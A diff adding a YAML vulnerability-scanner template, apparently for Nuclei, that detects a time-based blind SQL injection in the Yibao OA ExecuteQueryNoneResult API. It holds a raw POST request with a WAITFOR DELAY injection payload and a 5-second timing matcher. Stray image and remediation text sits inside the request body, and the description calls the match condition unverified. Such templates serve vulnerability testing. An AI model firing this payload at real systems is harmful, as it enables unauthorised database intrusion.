@@ -1,0 +1,45 @@
+id: poc-hx3yik854b58izqa
+info:
+  name: 易宝OA ExecuteQueryNoneResult SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hx3yik854b58izqa
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hx3yik854b58izqa
+http:
+- raw:
+  - 'POST /api/system/ExecuteQueryNoneResult HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+
+
+    token=zxh&cmdText=;WAITFOR DELAY ''0:0:5''--
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058285605-62fc3509-1792-48f8-90c8-282026081b09.png)
+
+
+    ## 修复建议
+
+    <font style="color:#333333;">1、请联系厂商进行修复或升级到安全版本。
+
+    </font><font style="color:#333333;">2、如非必要，禁止公网访问该系统。
+
+    </font><font style="color:#333333;">3、设置白名单访问。</font>'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
